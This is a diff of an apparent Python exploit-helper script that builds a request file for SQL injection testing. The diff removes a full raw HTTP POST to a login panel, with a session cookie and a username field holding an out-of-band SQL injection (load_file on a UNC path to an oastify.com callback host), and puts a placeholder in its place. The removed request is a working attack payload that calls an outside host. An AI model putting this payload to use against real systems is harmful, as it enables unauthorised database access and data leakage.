@@ -18,29 +18,7 @@ def create_exploit_file():
     # Content-Type: application/x-www-form-urlencoded
     #
     # param1=value1&param2=value2
-    payload = """POST /barbarbaba/panel/ HTTP/1.1
-Host: pwnedhost.com
-Cache-Control: max-age=0
-Sec-CH-UA: "Chromium";v="138", "Not;A=Brand";v="24", "Google Chrome";v="138"
-Sec-CH-UA-Mobile: ?0
-Sec-CH-UA-Platform: "Windows"
-Accept-Language: en-US;q=0.9,en;q=0.8
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Sec-Fetch-Site: none
-Sec-Fetch-Mode: navigate
-Sec-Fetch-User: ?1
-Sec-Fetch-Dest: document
-Accept-Encoding: gzip, deflate, br
-Connection: close
-Cookie: PHPSESSID=p9m0ggi1the035ksvm7elm4q4l
-Origin: https://pwnedhost.com
-Upgrade-Insecure-Requests: 1
-Referer: https://pwnedhost.com/barbarbaba/panel/
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 78
-
-username=mayurik'%2b(select%20load_file('%5c%5c%5c%5cn2qpw9b8p3e5jt1re0zo8nmg1772vtxhokccz2nr.oastify.com%5c%5cpwu'))%2b'&password=rootadmin&g-recaptcha-response=mayurik&login=Sign+In"""  # <-- Replace this whole string with your real HTTP request
+    payload = """Your_POST_Request_here!"""  # <-- Replace this whole string with your real HTTP request
 
     if payload.strip() == "" or payload.strip() == "Your_POST_Request_here!":
         print(Fore.RED + "❌ ERROR: You must replace the placeholder payload with your actual POST or GET request before running.")
